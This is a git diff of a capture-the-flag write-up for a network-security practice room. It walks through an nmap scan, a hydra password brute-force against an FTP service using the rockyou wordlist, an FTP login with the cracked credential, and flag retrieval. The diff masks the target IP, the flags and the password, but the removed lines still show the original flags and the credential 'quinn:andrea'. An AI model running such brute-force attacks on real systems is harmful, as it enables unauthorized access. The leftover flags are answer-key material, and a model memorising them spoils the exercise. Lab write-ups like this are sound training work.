@@ -17,55 +17,57 @@ Practice the skills you have learned in the Network Security module.
 
 | Title | IP Address |
 | :----: | :----: |
-| NetSecMod Room 09 Challenge v1.11 | 10.10.91.0 |
+| NetSecMod Room 09 Challenge v1.11 | `1*.**.**.*` |
 
 ## Task 1
 
 ```bash
-export IP=10.10.91.0
+export IP=1*.**.**.*
 ```
 
 ## Task 2
 
 ```bash
-sudo nmap -A -p- -T4 -vv -oN initial.nmap $IP
+sudo nmap -A -p- -T4 -vv -oA initial $IP
 ```
 
-Result: [initial.nmap](initial.nmap)
+> `****/tcp  open  http        syn-ack ttl 61 Node.js (Express middleware)`
 
-> `8080/tcp  open  http        syn-ack ttl 61 Node.js (Express middleware)`
+> `*****/tcp open  ftp         syn-ack ttl 61 v***** 3.*.*`
 
-> `10021/tcp open  ftp         syn-ack ttl 61 vsftpd 3.0.3`
+> `|_http-server-header: lighttpd THM{***_******_*****}`
 
-> `|_http-server-header: lighttpd THM{web_server_25352}`
-
-> `|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}`
+> `|_    SSH-2.0-OpenSSH_8.2p1 THM{************}`
 
 ```bash
-hydra -l quinn -P /usr/share/wordlists/rockyou.txt -t 20 -s 10021 -v $IP ftp | tee quinn.hydra
+hydra -l quinn -P /usr/share/wordlists/rockyou.txt -t 20 -s 10021 -v $IP ftp
 ```
 
-Result: 
+> `[10021][ftp] host: 1*.**.**.*   login: quinn   password: a*****`
 
-- [eddie.hydra](eddie.hydra)
-- [quinn.hydra](quinn.hydra)
-
-> `[10021][ftp] host: 10.10.91.0   login: quinn   password: andrea`
-
-Using: `quinn:andrea`
+Using: `quinn:a*****`
 
 ```bash
-ftp 10.10.91.0 10021
+ftp 1*.**.**.* 10021
+```
+
+RHOST:
+
+```bash
 ls
 get ftp_flag.txt
 ```
 
-Result: [ftp_flag.txt](ftp_flag.txt)
+LHOST:
 
-> `THM{321452667098}`
+```bash
+cat ftp_flag.txt
+```
+
+> `THM{************}`
 
 ```bash
 sudo nmap -sN $IP
 ```
 
-> `THM{f7443f99}`
+> `THM{********}`
